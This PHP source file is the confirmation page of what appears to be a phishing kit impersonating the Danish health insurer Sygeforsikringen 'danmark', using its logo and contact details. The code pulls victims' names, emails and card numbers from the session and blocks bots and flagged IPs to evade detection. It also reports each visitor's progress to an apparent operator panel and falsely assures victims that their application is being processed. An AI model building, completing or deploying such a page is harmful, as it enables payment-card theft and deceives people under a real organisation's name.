<?php
session_start();
require_once 'config.php';

$ip = getVisitorIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Vérifier automatiquement si c'est un bot AVANT tout traitement
require_once 'auto_bot_blocker.php';
if (isBotVisitor($userAgent, $ip)) {
    autoBlockBot($ip, $userAgent, 'Bot detected on thankyou page');
    http_response_code(403);
    header('Content-Type: text/plain');
    echo "Access Denied";
    exit;
}

// Vérifier si l'IP est bloquée
if (isIPBlocked($ip)) {
    http_response_code(403);
    echo "<!DOCTYPE html><html><head><title>Access Denied</title></head><body><h1>Access Denied</h1><p>Your access has been restricted.</p></body></html>";
    exit;
}

updateVisitorStatus($ip, 'thankyou', 'online');

// Récupérer les données de session
$fullname = $_SESSION['fullname'] ?? 'Ikke angivet';
$email = $_SESSION['email'] ?? 'Ikke angivet';
$cardNumber = $_SESSION['card_number'] ?? '';

// Masquer le numéro de carte (afficher seulement les 4 derniers chiffres)
$last4 = '';
if ($cardNumber) {
    $cleaned = preg_replace('/\s+/', '', $cardNumber);
    $last4 = substr($cleaned, -4);
}

// Générer un numéro de référence unique
$referenceNumber = 'DK-' . strtoupper(substr(md5($ip . time()), 0, 12));
?>
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tak for din ansøgning | Sygeforsikringen "danmark"</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="apple-touch-icon" href="apple-touch-icon.png">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <header class="header">
        <div class="header-content">
            <div class="logo">
     <img align="center" border="0" src="https://s3-eu-west-1.amazonaws.com/mimgs/cdn/TWO/2436/thlHNdETFm9fb2KIsG5w_logo_danmark.png" alt="" title="" style="outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;clear: both;display: inline-block !important;border: none;height: auto;float: none;width: 100%;max-width: 168px;" width="168"/>
            </div>
            <a href="tel:70109070" class="phone">70 10 90 70</a>
        </div>
    </header>

    <div class="container">
        <!-- Success Icon -->
        <div style="text-align: center; margin-bottom: 30px;">
            <div style="width: 100px; height: 100px; background-color: #28a745; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 50px; color: white;">
                ✓
            </div>
        </div>

        <h1 style="color: #28a745; text-align: center;">Tak for din ansøgning!</h1>
        <p class="subtitle" style="text-align: center;">Din ansøgning er blevet modtaget og behandles nu.</p>

        <!-- Success Badge -->
        <div class="security-badge" style="background-color: #d4edda; border-color: #28a745; color: #155724; margin-bottom: 30px;">
            <div class="security-badge-icon">✓</div>
            <div class="security-badge-text">Din ansøgning er blevet sendt succesfuldt</div>
        </div>

        <!-- Customer Information -->
        <div style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 25px; margin-bottom: 25px;">
            <h3 style="font-size: 16px; color: #495057; margin-bottom: 20px; display: flex; align-items: center; gap: 8px;">
                📋 Dine oplysninger
            </h3>
            
            <div style="display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #e9ecef;">
                <span style="color: #6c757d; font-size: 14px;">Navn:</span>
                <span style="color: #212529; font-weight: 500; font-size: 14px;"><?php echo htmlspecialchars($fullname); ?></span>
            </div>
            
            <div style="display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #e9ecef;">
                <span style="color: #6c757d; font-size: 14px;">E-mail:</span>
                <span style="color: #212529; font-weight: 500; font-size: 14px;"><?php echo htmlspecialchars($email); ?></span>
            </div>
            
            <?php if ($last4): ?>
            <div style="display: flex; justify-content: space-between; padding: 12px 0;">
                <span style="color: #6c757d; font-size: 14px;">Kort:</span>
                <span style="color: #212529; font-weight: 500; font-size: 14px;">**** **** **** <?php echo htmlspecialchars($last4); ?></span>
            </div>
            <?php endif; ?>
        </div>

        <!-- Reference Number -->
        <div style="background: #e7f3ff; border: 1px solid #b3d9ff; border-radius: 8px; padding: 20px; margin-bottom: 25px; text-align: center;">
            <div style="font-size: 13px; color: #004085; margin-bottom: 8px;">Dit referencenummer:</div>
            <div style="font-size: 20px; font-weight: bold; color: #004085; font-family: monospace; letter-spacing: 2px;">
                <?php echo $referenceNumber; ?>
            </div>
            <div style="font-size: 12px; color: #6c757d; margin-top: 8px;">Gem dette nummer til fremtidig reference</div>
        </div>

        <!-- Next Steps -->
        <div style="background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 20px; margin-bottom: 25px;">
            <h3 style="font-size: 15px; color: #856404; margin-bottom: 15px; display: flex; align-items: center; gap: 8px;">
                📌 Næste skridt
            </h3>
            <ul style="margin: 0; padding-left: 20px; color: #856404; font-size: 14px; line-height: 1.8;">
                <li>Du vil modtage en bekræftelses-e-mail inden for 24 timer</li>
                <li>Vores team vil gennemgå din ansøgning</li>
                <li>Vi kontakter dig, hvis vi har brug for yderligere oplysninger</li>
                <li>Du kan forvente et svar inden for 2-5 hverdage</li>
            </ul>
        </div>

        <!-- Contact Information -->
        <div style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; margin-bottom: 25px;">
            <h3 style="font-size: 15px; color: #495057; margin-bottom: 15px; display: flex; align-items: center; gap: 8px;">
                📞 Har du spørgsmål?
            </h3>
            <div style="font-size: 14px; color: #6c757d; line-height: 1.8;">
                <div style="margin-bottom: 10px;">
                    <strong>Telefon:</strong> <a href="tel:70109070" style="color: #9d1b30; text-decoration: none;">70 10 90 70</a>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>E-mail:</strong> <a href="mailto:kontakt@sygeforsikring.dk" style="color: #9d1b30; text-decoration: none;">kontakt@sygeforsikring.dk</a>
                </div>
                <div>
                    <strong>Åbningstider:</strong> Man-Fre 9:00-17:00
                </div>
            </div>
        </div>

        <!-- Back to Home Button -->
        <a href="index.php" class="btn" style="display: block; text-align: center; text-decoration: none;">
            🏠 Tilbage til forsiden
        </a>

        <div style="text-align: center; color: #999; font-size: 12px; margin-top: 30px;">
            Ansøgning modtaget: <?php echo date('d/m/Y H:i'); ?>
        </div>
    </div>

    <script>
        // Mettre à jour le statut une seule fois au chargement
        fetch('api/heartbeat.php?page=page5');
    </script>
</body>
</html>
